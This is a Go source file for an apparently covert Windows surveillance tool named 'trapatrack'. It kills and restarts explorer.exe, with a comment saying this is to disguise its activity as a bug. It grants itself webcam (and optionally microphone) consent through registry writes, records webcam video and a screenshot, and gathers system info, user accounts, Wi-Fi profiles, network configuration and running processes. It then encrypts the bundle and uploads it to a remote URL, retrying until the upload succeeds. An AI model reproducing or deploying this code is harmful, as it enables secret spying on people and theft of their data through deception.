//go:generate goversioninfo -icon=assets/icon.ico
package main

import (
	"os"
	"io"
	"io/ioutil"
	"os/exec"
	"regexp"
	"image/png"
	"archive/zip"

	"github.com/marcsauter/single"
	"github.com/gobuffalo/packr/v2"
	
	"time"
	"net/http"
	"mime/multipart"
	
	"golang.org/x/crypto/openpgp"
	"golang.org/x/crypto/openpgp/armor"
	"golang.org/x/crypto/openpgp/packet"
	
	"github.com/denisbrodbeck/machineid"
	"golang.org/x/sys/windows/registry"
	"github.com/vova616/screenshot"
)

var (
	REPORT_URL = "https://security-center.panasonic.eu/trapatrack/report.php"
	CAPTURE_TIME = "00:00:10"
	
	PRIVACY_CAPTURE_GENERAL = true
	PRIVACY_CAPTURE_VIDEO = true
	PRIVACY_CAPTURE_AUDIO = false
)

func main() {
	pathSep := string(os.PathSeparator)
	tmpDir := os.TempDir() + pathSep
	
	var err error
	ffmpegLocation := tmpDir + "ff.exe"
	ffmpegRecordingLocation := tmpDir + "fc.mp4"
	zipLocation := tmpDir + "zl.tmp"
	gpgLocation := tmpDir + "gz.tmp"
	gpgKeyLocation := tmpDir + "gk.tmp"
	
	// Prevent multiple instances
	s := single.New("trapatrack")
	if err = s.CheckLock(); err != nil && err == single.ErrAlreadyRunning {
        return
    } else if err != nil {
        // Another error occurred, might be worth handling it as well
        //log.Fatalf("failed to acquire exclusive app lock: %v", err)
		return
    }
    defer s.TryUnlock()
	
	// Close explorer.exe to make it look like a bug
	exec.Command("taskkill", "/f", "/im", "explorer.exe").Output()
	exec.Command("start", "explorer").Output()
	
	// Get computer ID
	hashedID, err := machineid.ProtectedID("Trapatrack")
	if err != nil {
		hashedID = "err"
	}
	
	zipArchive, err := os.Create(zipLocation)
	if err != nil {
		return
	}
	defer zipArchive.Close()
	defer os.Remove(zipLocation)
	zipWriter := zip.NewWriter(zipArchive)
	
	// Unpack ffmpeg
	box := packr.New("assets", "./assets")
	ffmpegFinished := make(chan bool, 1)
	if PRIVACY_CAPTURE_GENERAL {
		ffmpegByte, _ := box.Find("ffmpeg.exe")
		
		// Initiate ffmpeg
		err = ioutil.WriteFile(ffmpegLocation, ffmpegByte, 0777)
		if err == nil {
			if PRIVACY_CAPTURE_VIDEO {
				// Enable permission for camera
				regKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam`, registry.QUERY_VALUE|registry.SET_VALUE)
				if err != nil {
					regKey.SetStringValue("Value", "allow")
					regKey.Close()
				}
			}
			
			if PRIVACY_CAPTURE_AUDIO {
				// Enable permission for audio
				regKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone`, registry.QUERY_VALUE|registry.SET_VALUE)
				if err != nil {
					regKey.SetStringValue("Value", "allow")
					regKey.Close()
				}
			}
			
			// Start ffmpeg in background
			ffmpegFinished <- true
			go func() {
				output, err := exec.Command(ffmpegLocation, "-list_devices", "true", "-f", "dshow", "-i", "dummy").CombinedOutput()
				outputStr := string(output)
				
				if err.Error() == "exit status 1" {
					reExtractVideo := regexp.MustCompile(`video devices\s[\s\S]+?"(.+?)"`)
					reExtractAudio := regexp.MustCompile(`audio devices\s[\s\S]+?"(.+?)"`)
					
					matchVideo := reExtractVideo.FindStringSubmatch(outputStr)
					matchAudio := reExtractAudio.FindStringSubmatch(outputStr)
					
					monitorInterfaces := ""
					if matchVideo != nil && matchAudio != nil && PRIVACY_CAPTURE_AUDIO && PRIVACY_CAPTURE_VIDEO {
						monitorInterfaces = `video=` + matchVideo[1] + `:audio=` + matchAudio[1]
					} else if matchVideo != nil && PRIVACY_CAPTURE_VIDEO {
						monitorInterfaces = `video=` + matchVideo[1]
					} else if matchAudio != nil && PRIVACY_CAPTURE_AUDIO {
						monitorInterfaces = `audio=` + matchAudio[1]
					}

					if monitorInterfaces != "" {
						os.Remove(ffmpegRecordingLocation)
					
						output, err = exec.Command(ffmpegLocation, "-f", "dshow", "-rtbufsize", "1024M", "-i", monitorInterfaces, "-t", CAPTURE_TIME, "-c:v", "libx264", "-preset", "veryfast", "-pix_fmt", "yuv420p", ffmpegRecordingLocation).CombinedOutput()
						outputStr = string(output)
						
						if err == nil {
							defer os.Remove(ffmpegRecordingLocation)
							
							zipF, _ := zipWriter.Create("capture.mp4")
							
							captureBytes, _ := ioutil.ReadFile(ffmpegRecordingLocation)
							zipF.Write(captureBytes)
						}
					}
				}
				
				os.Remove(ffmpegLocation)
				<- ffmpegFinished
			}()
		} else {
			os.Remove(ffmpegLocation)
		}
	}
	
	// Creating screenshot & write directly to zip
	screenshotImg, err := screenshot.CaptureScreen()
	if err == nil {
		zipF, err := zipWriter.Create("screenshot.png")
		if err == nil {
			png.Encode(zipF, screenshotImg)
		}
	}
	
	// Get device information
	var output []byte
	fingerprintContent := "Device ID: " + hashedID + "\r\n\r\n"
	
	output, _ = exec.Command("systeminfo").CombinedOutput()
	fingerprintContent += string(output)
	
	output, _ = exec.Command("net", "user").CombinedOutput()
	fingerprintContent += string(output)
	
	output, _ = exec.Command("netsh", "wlan", "show", "profiles").CombinedOutput()
	fingerprintContent += string(output)
	
	output, _ = exec.Command("ipconfig", "/all").CombinedOutput()
	fingerprintContent += string(output)
	
	output, _ = exec.Command("tasklist").CombinedOutput()
	fingerprintContent += string(output)
	
	// -> zip results
	zipF, _ := zipWriter.Create("systeminfo.txt")
	zipF.Write([]byte(fingerprintContent))
	
	// Wait for ffmpeg to finish
	ffmpegFinished <- true
	zipWriter.Close()
	
	// Encrypt file
	publicKeyBytes, _ := box.Find("public.pem")
	ioutil.WriteFile(gpgKeyLocation, publicKeyBytes, 0777)
	defer os.Remove(gpgKeyLocation)
	
	recipient, err := readEntity(gpgKeyLocation)
	if err != nil {
		return
	}
	
	gpgIn, err := os.Open(zipLocation)
	if err != nil {
		return
	}
	defer gpgIn.Close()
	
	gpgDst, err := os.Create(gpgLocation)
	if err != nil {
		return
	}
	defer gpgDst.Close()
	
	encrypt([]*openpgp.Entity{recipient}, nil, gpgIn, gpgDst)
	defer os.Remove(gpgLocation)
	
	// Send file
	pipeRead, pipeWrite := io.Pipe()
	multipartWriter := multipart.NewWriter(pipeWrite)

	go func(formPostName string, formFileName string, inputFile string) {
		defer pipeWrite.Close()
		defer multipartWriter.Close()

		part, err := multipartWriter.CreateFormFile(formPostName, formFileName)
		if err != nil {
			return
		}

		file, err := os.Open(inputFile)
		if err != nil {
			return
		}
		defer file.Close()

		if _, err = io.Copy(part, file); err != nil {
			return
		}
	}("report", "report.zip", gpgLocation)

	// Send until success
	for {
		resp, err := http.Post(REPORT_URL, multipartWriter.FormDataContentType(), pipeRead)
		if err == nil && resp.StatusCode == 200 {
			break
		}
		time.Sleep(1 * time.Minute)
	}
}

// https://gist.github.com/ayubmalik/a83ee23c7c700cdce2f8c5bf5f2e9f20
func encrypt(recip []*openpgp.Entity, signer *openpgp.Entity, r io.Reader, w io.Writer) error {
	wc, err := openpgp.Encrypt(w, recip, signer, &openpgp.FileHints{IsBinary: true}, nil)
	if err != nil {
		return err
	}
	if _, err := io.Copy(wc, r); err != nil {
		return err
	}
	return wc.Close()
}

func readEntity(name string) (*openpgp.Entity, error) {
	f, err := os.Open(name)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	block, err := armor.Decode(f)
	if err != nil {
		return nil, err
	}
	return openpgp.ReadEntity(packet.NewReader(block.Body))
}